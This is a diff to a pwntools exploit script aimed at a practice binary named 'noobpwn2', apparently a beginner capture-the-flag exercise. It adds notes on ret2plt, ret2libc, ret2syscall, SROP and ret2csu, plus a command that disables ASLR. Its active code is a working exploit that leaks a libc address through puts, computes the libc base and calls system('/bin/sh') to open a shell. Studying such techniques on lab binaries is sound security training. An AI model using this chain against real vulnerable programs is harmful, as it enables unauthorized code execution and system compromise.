@@ -5,7 +5,7 @@
 from pwn import *
 
 # Set up pwntools for the correct architecture
-elf = context.binary = ELF('./noob/noobpwn1', checksec=True)
+elf = context.binary = ELF('./noob/noobpwn2', checksec=True)
 
 # Enable verbose logging so we can see exactly what is being sent (info/debug)
 # context.log_level = 'debug'
@@ -81,10 +81,76 @@ io = start()
 
 #rop
 # pop_rdi = 
-# bin_sh = 
+# bin_sh = pwndbg> search /bin/sh
 # ret = 
-# system = elf.sym.system
+# system = elf.sym.system or pwndbg> p system
 # payload = cyclic(40) + pack(pop_rdi) + pack(bin_sh) + pack(ret) + pack(system)
 
-io.sendlineafter(b'?', payload)
+#ASLR off-> 0 | ASLR on-> 2 | To turn off
+# $echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+
+#ret2plt
+#this payload prints puts() address
+# payload = cyclic(40) + pack(pop_rdi) + pack(elf.got.puts) + pack(elf.sym.puts) + pack(elf.sym.main)
+# io.sendline(payload)
+#recv leak and calc base
+# $ldd ./ret2plt
+# $objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep -i puts
+# libc = elf.libc
+# leak = io.recvlines(2)[1]
+# leak_int = unpack(leak, 'all')
+# distance = libc.sym.puts
+# libc_base = leak_int - distance
+# print(hex(libc_base))
+#ret2libc
+# $strings -t x /lib/x86_64-linux-gnu/libc.so.6 | grep -i /bin/sh
+# $objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep -i system
+# bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))
+# system = libc_base + libc.sym.system
+# payload = cyclic(40) + pack(pop_rdi) + pack(bin_sh) + pack(ret) + pack(system)
+
+#ret2syscall
+# pop_rax = 
+# pop_rdi = 
+# pop_rsi = 
+# pop_rdx = 
+# syscall = 
+# payload = cyclic(8) + pack(pop_rax) + pack(59) + pack(pop_rdi) + pack(bin_sh) + pack(pop_rsi) + pack(0) + pack(pop_rdx) + pack(0) + pack(syscall)
+
+#srop
+#uses sigreturn
+# pop_rax = 
+# syscall = 
+# frame = SigreturnFrame()
+# frame.rax = 59
+# frame.rdi = bin_sh
+# frame.rsi = 0
+# frame.rdx = 0
+# frame.rip = syscall
+# payload = cyclic(8) + pack(pop_rax) + pack(15) + pack(syscall) + bytes(frame)
+
+#ret2csu
+#after first payload and calculating libc_base from ret2plt
+# payload = cyclic(56) + pack(libc_base + one_gadget)
+
+#Example
+pop_rdi = 0x401196
+ret = 0x40101a
+io.sendline(b'a')
+payload = cyclic(40) + pack(pop_rdi) + pack(elf.got.puts) + pack(elf.sym.puts) + pack(elf.sym.main)
+io.sendline(payload)
+
+libc = elf.libc
+leak = io.recvlines(6)[-1]
+print("The leaked data is:" + str(leak))
+leak_int = unpack(leak, 'all')
+libc_base = leak_int - libc.sym.puts
+print(hex(libc_base))
+bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))
+system = libc_base + libc.sym.system
+
+# return to system
+io.sendline(b'a')
+payload = cyclic(40) + pack(pop_rdi) + pack(bin_sh) + pack(ret) + pack(system)
+io.sendline(payload)
 io.interactive()
